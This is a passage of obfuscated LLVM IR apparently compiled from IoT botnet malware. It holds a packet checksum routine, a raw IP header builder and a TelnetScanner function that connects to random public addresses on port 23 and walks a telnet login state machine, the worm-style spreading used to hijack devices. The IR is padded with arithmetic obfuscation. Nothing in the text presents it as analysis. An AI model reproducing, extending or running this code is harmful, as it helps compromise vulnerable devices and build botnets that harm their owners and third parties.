  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 %14, 6960861433940434803
  %16 = add i64 %15, %13
  %17 = add i64 %16, 6960861433940434803
  %18 = add i64 %14, %13
  store i64 %17, i64* %5, align 8
  %19 = load i32, i32* %4, align 4
  %20 = sub i32 %19, 410633048
  %21 = sub i32 %20, 2
  %22 = add i32 %21, 410633048
  %23 = sub nsw i32 %19, 2
  store i32 %22, i32* %4, align 4
  br label %6

; <label>:24:                                     ; preds = %6
  %25 = load i32, i32* %4, align 4
  %26 = icmp sgt i32 %25, 0
  br i1 %26, label %27, label %38

; <label>:27:                                     ; preds = %24
  %28 = load i16*, i16** %3, align 8
  %29 = bitcast i16* %28 to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = load i64, i64* %5, align 8
  %33 = sub i64 0, %32
  %34 = sub i64 0, %31
  %35 = add i64 %33, %34
  %36 = sub i64 0, %35
  %37 = add i64 %32, %31
  store i64 %36, i64* %5, align 8
  br label %38

; <label>:38:                                     ; preds = %27, %24
  br label %39

; <label>:39:                                     ; preds = %43, %38
  %40 = load i64, i64* %5, align 8
  %41 = lshr i64 %40, 16
  %42 = icmp ne i64 %41, 0
  br i1 %42, label %43, label %55

; <label>:43:                                     ; preds = %39
  %44 = load i64, i64* %5, align 8
  %45 = xor i64 65535, -1
  %46 = xor i64 %44, %45
  %47 = and i64 %46, %44
  %48 = and i64 %44, 65535
  %49 = load i64, i64* %5, align 8
  %50 = lshr i64 %49, 16
  %51 = add i64 %47, -8030720101195325328
  %52 = add i64 %51, %50
  %53 = sub i64 %52, -8030720101195325328
  %54 = add i64 %47, %50
  store i64 %53, i64* %5, align 8
  br label %39

; <label>:55:                                     ; preds = %39
  %56 = load i64, i64* %5, align 8
  %57 = xor i64 %56, -1
  %58 = and i64 -1, %57
  %59 = xor i64 -1, -1
  %60 = and i64 %56, %59
  %61 = or i64 %58, %60
  %62 = xor i64 %56, -1
  %63 = trunc i64 %61 to i16
  ret i16 %63
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #10
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #5
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #5
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #3

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = xor i8 -16, -1
  %15 = xor i8 %13, %14
  %16 = and i8 %15, %13
  %17 = and i8 %13, -16
  %18 = and i8 %16, 5
  %19 = xor i8 %16, 5
  %20 = or i8 %18, %19
  %21 = or i8 %16, 5
  store i8 %20, i8* %12, align 4
  %22 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %23 = bitcast %struct.iphdr* %22 to i8*
  %24 = load i8, i8* %23, align 4
  %25 = xor i8 %24, -1
  %26 = xor i8 15, -1
  %27 = xor i8 -48, -1
  %28 = or i8 %25, %26
  %29 = or i8 -48, %27
  %30 = xor i8 %28, -1
  %31 = and i8 %30, %29
  %32 = and i8 %24, 15
  %33 = xor i8 %31, -1
  %34 = xor i8 64, -1
  %35 = xor i8 82, -1
  %36 = and i8 %33, 82
  %37 = and i8 %31, %35
  %38 = and i8 %34, 82
  %39 = and i8 64, %35
  %40 = or i8 %36, %37
  %41 = or i8 %38, %39
  %42 = xor i8 %40, %41
  %43 = or i8 %33, %34
  %44 = xor i8 %43, -1
  %45 = or i8 82, %35
  %46 = and i8 %44, %45
  %47 = or i8 %42, %46
  %48 = or i8 %31, 64
  store i8 %47, i8* %23, align 4
  %49 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %50 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %49, i32 0, i32 1
  store i8 0, i8* %50, align 1
  %51 = load i32, i32* %10, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 0, %52
  %54 = sub i64 20, %53
  %55 = add i64 20, %52
  %56 = trunc i64 %54 to i16
  %57 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %58 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %57, i32 0, i32 2
  store i16 %56, i16* %58, align 2
  %59 = call i32 @rand_cmwc()
  %60 = trunc i32 %59 to i16
  %61 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %62 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %61, i32 0, i32 3
  store i16 %60, i16* %62, align 4
  %63 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %64 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %63, i32 0, i32 4
  store i16 0, i16* %64, align 2
  %65 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %66 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %65, i32 0, i32 5
  store i8 -1, i8* %66, align 4
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %69 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %68, i32 0, i32 6
  store i8 %67, i8* %69, align 1
  %70 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %71 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %70, i32 0, i32 7
  store i16 0, i16* %71, align 2
  %72 = load i32, i32* %8, align 4
  %73 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %74 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %73, i32 0, i32 8
  store i32 %72, i32* %74, align 4
  %75 = load i32, i32* %7, align 4
  %76 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %77 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %76, i32 0, i32 9
  store i32 %75, i32* %77, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define void @TelnetScanner(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [128 x i8], align 16
  %11 = alloca i8, align 1
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %30 = call i32 @getdtablesize() #5
  %31 = sub i32 0, 100
  %32 = add i32 %30, %31
  %33 = sub nsw i32 %30, 100
  store i32 %32, i32* %5, align 4
  %34 = load i32, i32* %5, align 4
  %35 = load i32, i32* %4, align 4
  %36 = icmp sgt i32 %34, %35
  br i1 %36, label %37, label %39

; <label>:37:                                     ; preds = %2
  %38 = load i32, i32* %4, align 4
  store i32 %38, i32* %5, align 4
  br label %39

; <label>:39:                                     ; preds = %37, %2
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %40, align 4
  %41 = call zeroext i16 @htons(i16 zeroext 23) #10
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %41, i16* %42, align 2
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %44 = getelementptr inbounds [8 x i8], [8 x i8]* %43, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 8, i32 4, i1 false)
  %45 = call noalias i8* @malloc(i64 1025) #5
  store i8* %45, i8** %17, align 8
  %46 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 1025, i32 1, i1 false)
  %47 = load i32, i32* %5, align 4
  %48 = zext i32 %47 to i64
  %49 = call i8* @llvm.stacksave()
  store i8* %49, i8** %19, align 8
  %50 = alloca %struct.telstate_t, i64 %48, align 16
  %51 = bitcast %struct.telstate_t* %50 to i8*
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = mul i64 %53, 5
  call void @llvm.memset.p0i8.i64(i8* %51, i8 0, i64 %54, i32 16, i1 false)
  store i32 0, i32* %6, align 4
  br label %55

; <label>:55:                                     ; preds = %73, %39
  %56 = load i32, i32* %6, align 4
  %57 = load i32, i32* %5, align 4
  %58 = icmp slt i32 %56, %57
  br i1 %58, label %59, label %79

; <label>:59:                                     ; preds = %55
  %60 = load i32, i32* %6, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %61
  %63 = bitcast %struct.telstate_t* %62 to i8*
  call void @llvm.memset.p0i8.i64(i8* %63, i8 0, i64 32, i32 16, i1 false)
  %64 = load i32, i32* %6, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %65
  %67 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %66, i32 0, i32 3
  store i8 1, i8* %67, align 1
  %68 = load i8*, i8** %17, align 8
  %69 = load i32, i32* %6, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %70
  %72 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %71, i32 0, i32 9
  store i8* %68, i8** %72, align 8
  br label %73

; <label>:73:                                     ; preds = %59
  %74 = load i32, i32* %6, align 4
  %75 = sub i32 %74, -2139507990
  %76 = add i32 %75, 1
  %77 = add i32 %76, -2139507990
  %78 = add nsw i32 %74, 1
  store i32 %77, i32* %6, align 4
  br label %55

; <label>:79:                                     ; preds = %55
  br label %80

; <label>:80:                                     ; preds = %1224, %79
  br label %81

; <label>:81:                                     ; preds = %80
  store i32 0, i32* %6, align 4
  br label %82

; <label>:82:                                     ; preds = %1218, %81
  %83 = load i32, i32* %6, align 4
  %84 = load i32, i32* %5, align 4
  %85 = icmp slt i32 %83, %84
  br i1 %85, label %86, label %1224

; <label>:86:                                     ; preds = %82
  %87 = load i32, i32* %6, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %88
  %90 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %89, i32 0, i32 7
  %91 = load i32, i32* %90, align 16
  %92 = icmp eq i32 %91, 0
  br i1 %92, label %93, label %100

; <label>:93:                                     ; preds = %86
  %94 = call i64 @time(i64* null) #5
  %95 = trunc i64 %94 to i32
  %96 = load i32, i32* %6, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %97
  %99 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %98, i32 0, i32 7
  store i32 %95, i32* %99, align 16
  br label %100

; <label>:100:                                    ; preds = %93, %86
  %101 = load i32, i32* %6, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %102
  %104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %103, i32 0, i32 2
  %105 = load i8, i8* %104, align 8
  %106 = zext i8 %105 to i32
  switch i32 %106, label %1217 [
    i32 0, label %107
    i32 1, label %253
    i32 2, label %368
    i32 3, label %422
    i32 4, label %446
    i32 5, label %501
    i32 6, label %525
    i32 7, label %628
    i32 8, label %644
    i32 9, label %678
    i32 10, label %694
    i32 11, label %728
    i32 12, label %744
    i32 13, label %806
    i32 14, label %851
    i32 15, label %896
    i32 16, label %1187
  ]

; <label>:107:                                    ; preds = %100
  %108 = load i32, i32* %6, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %109
  %111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %110, i32 0, i32 3
  %112 = load i8, i8* %111, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp eq i32 %113, 1
  br i1 %114, label %115, label %135

; <label>:115:                                    ; preds = %107
  %116 = load i32, i32* %6, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %117
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %118, i32 0, i32 9
  %120 = load i8*, i8** %119, align 8
  store i8* %120, i8** %20, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %122
  %124 = bitcast %struct.telstate_t* %123 to i8*
  call void @llvm.memset.p0i8.i64(i8* %124, i8 0, i64 32, i32 16, i1 false)
  %125 = load i8*, i8** %20, align 8
  %126 = load i32, i32* %6, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %127
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %128, i32 0, i32 9
  store i8* %125, i8** %129, align 8
  %130 = call i32 @getRandomPublicIP()
  %131 = load i32, i32* %6, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %132
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %133, i32 0, i32 1
  store i32 %130, i32* %134, align 4
  br label %190

; <label>:135:                                    ; preds = %107
  %136 = load i32, i32* %6, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %137
  %139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %138, i32 0, i32 3
  %140 = load i8, i8* %139, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 0
  br i1 %142, label %143, label %189

; <label>:143:                                    ; preds = %135
  %144 = load i32, i32* %6, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %145
  %147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %146, i32 0, i32 4
  %148 = load i8, i8* %147, align 2
  %149 = sub i8 %148, -10
  %150 = add i8 %149, 1
  %151 = add i8 %150, -10
  %152 = add i8 %148, 1
  store i8 %151, i8* %147, align 2
  %153 = load i32, i32* %6, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %154
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %155, i32 0, i32 5
  %157 = load i8, i8* %156, align 1
  %158 = sub i8 0, %157
  %159 = sub i8 0, 1
  %160 = add i8 %158, %159
  %161 = sub i8 0, %160
  %162 = add i8 %157, 1
  store i8 %161, i8* %156, align 1
  %163 = load i32, i32* %6, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %164
  %166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %165, i32 0, i32 5
  %167 = load i8, i8* %166, align 1
  %168 = zext i8 %167 to i64
  %169 = icmp eq i64 %168, 19
  br i1 %169, label %170, label %175

; <label>:170:                                    ; preds = %143
  %171 = load i32, i32* %6, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %172
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %173, i32 0, i32 3
  store i8 1, i8* %174, align 1
  br label %1218

; <label>:175:                                    ; preds = %143
  %176 = load i32, i32* %6, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %177
  %179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %178, i32 0, i32 4
  %180 = load i8, i8* %179, align 2
  %181 = zext i8 %180 to i64
  %182 = icmp eq i64 %181, 19
  br i1 %182, label %183, label %188

; <label>:183:                                    ; preds = %175
  %184 = load i32, i32* %6, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %185
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %186, i32 0, i32 3
  store i8 1, i8* %187, align 1
  br label %1218

; <label>:188:                                    ; preds = %175
  br label %189

; <label>:189:                                    ; preds = %188, %135
  br label %190

; <label>:190:                                    ; preds = %189, %115
  %191 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %191, align 4
  %192 = call zeroext i16 @htons(i16 zeroext 23) #10
  %193 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %192, i16* %193, align 2
  %194 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %195 = getelementptr inbounds [8 x i8], [8 x i8]* %194, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %195, i8 0, i64 8, i32 4, i1 false)
  %196 = load i32, i32* %6, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %197
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %198, i32 0, i32 1
  %200 = load i32, i32* %199, align 4
  %201 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %202 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %201, i32 0, i32 0
  store i32 %200, i32* %202, align 4
  %203 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %204 = load i32, i32* %6, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %205
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %206, i32 0, i32 0
  store i32 %203, i32* %207, align 16
  %208 = load i32, i32* %6, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %209
  %211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %210, i32 0, i32 0
  %212 = load i32, i32* %211, align 16
  %213 = icmp eq i32 %212, -1
  br i1 %213, label %214, label %215

; <label>:214:                                    ; preds = %190
  br label %1218

; <label>:215:                                    ; preds = %190
  %216 = load i32, i32* %6, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %217
  %219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %218, i32 0, i32 0
  %220 = load i32, i32* %219, align 16
  %221 = load i32, i32* %6, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %222
  %224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %223, i32 0, i32 0
  %225 = load i32, i32* %224, align 16
  %226 = call i32 (i32, i32, ...) @fcntl(i32 %225, i32 3, i8* null)
  %227 = and i32 %226, 2048
  %228 = xor i32 %226, 2048
  %229 = or i32 %227, %228
  %230 = or i32 %226, 2048
  %231 = call i32 (i32, i32, ...) @fcntl(i32 %220, i32 4, i32 %229)
  %232 = load i32, i32* %6, align 4
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %233
  %235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %234, i32 0, i32 0
  %236 = load i32, i32* %235, align 16
  %237 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %238 = call i32 @connect(i32 %236, %struct.sockaddr* %237, i32 16)
  %239 = icmp eq i32 %238, -1
  br i1 %239, label %240, label %248

; <label>:240:                                    ; preds = %215
  %241 = call i32* @__errno_location() #10
  %242 = load i32, i32* %241, align 4
  %243 = icmp ne i32 %242, 115
  br i1 %243, label %244, label %248

; <label>:244:                                    ; preds = %240
  %245 = load i32, i32* %6, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %246
  call void @reset_telstate(%struct.telstate_t* %247)
  br label %252

; <label>:248:                                    ; preds = %240, %215
  %249 = load i32, i32* %6, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %250
  call void @advance_telstate(%struct.telstate_t* %251, i32 1)
  br label %252

; <label>:252:                                    ; preds = %248, %244
  br label %1217

; <label>:253:                                    ; preds = %100
  br label %254

; <label>:254:                                    ; preds = %253
  %255 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %256 = getelementptr inbounds [16 x i64], [16 x i64]* %255, i64 0, i64 0
  %257 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %256) #5, !srcloc !5
  %258 = extractvalue { i64, i64* } %257, 0
  %259 = extractvalue { i64, i64* } %257, 1
  %260 = trunc i64 %258 to i32
  store i32 %260, i32* %21, align 4
  %261 = ptrtoint i64* %259 to i64
  %262 = trunc i64 %261 to i32
  store i32 %262, i32* %22, align 4
  br label %263

; <label>:263:                                    ; preds = %254
  br label %264

; <label>:264:                                    ; preds = %263
  %265 = load i32, i32* %6, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %266
  %268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %267, i32 0, i32 0
  %269 = load i32, i32* %268, align 16
  %270 = srem i32 %269, 64
  %271 = zext i32 %270 to i64
  %272 = shl i64 1, %271
  %273 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %274 = load i32, i32* %6, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %275
  %277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %276, i32 0, i32 0
  %278 = load i32, i32* %277, align 16
  %279 = sdiv i32 %278, 64
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds [16 x i64], [16 x i64]* %273, i64 0, i64 %280
  %282 = load i64, i64* %281, align 8
  %283 = and i64 %282, %272
  %284 = xor i64 %282, %272
  %285 = or i64 %283, %284
  %286 = or i64 %282, %272
  store i64 %285, i64* %281, align 8
  %287 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %287, align 8
  %288 = load i32, i32* %3, align 4
  %289 = sext i32 %288 to i64
  %290 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %289, i64* %290, align 8
  %291 = load i32, i32* %6, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %292
  %294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %293, i32 0, i32 0
  %295 = load i32, i32* %294, align 16
  %296 = add i32 %295, 484106444
  %297 = add i32 %296, 1
  %298 = sub i32 %297, 484106444
  %299 = add nsw i32 %295, 1
  %300 = call i32 @select(i32 %298, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %300, i32* %7, align 4
  %301 = load i32, i32* %7, align 4
  %302 = icmp eq i32 %301, 1
  br i1 %302, label %303, label %342

; <label>:303:                                    ; preds = %264
  %304 = load i32, i32* %6, align 4
  %305 = sext i32 %304 to i64
  %306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %305
  %307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %306, i32 0, i32 7
  store i32 0, i32* %307, align 16
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %308 = load i32, i32* %6, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %309
  %311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %310, i32 0, i32 0
  %312 = load i32, i32* %311, align 16
  %313 = bitcast i32* %15 to i8*
  %314 = call i32 @getsockopt(i32 %312, i32 1, i32 4, i8* %313, i32* %14) #5
  %315 = load i32, i32* %15, align 4
  %316 = icmp ne i32 %315, 0
  br i1 %316, label %317, label %321

; <label>:317:                                    ; preds = %303
  %318 = load i32, i32* %6, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %319
  call void @reset_telstate(%struct.telstate_t* %320)
  br label %341

; <label>:321:                                    ; preds = %303
  %322 = load i32, i32* %6, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %323
  %325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %324, i32 0, i32 0
  %326 = load i32, i32* %325, align 16
  %327 = load i32, i32* %6, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %328
  %330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %329, i32 0, i32 0
  %331 = load i32, i32* %330, align 16
  %332 = call i32 (i32, i32, ...) @fcntl(i32 %331, i32 3, i8* null)
  %333 = xor i32 -2049, -1
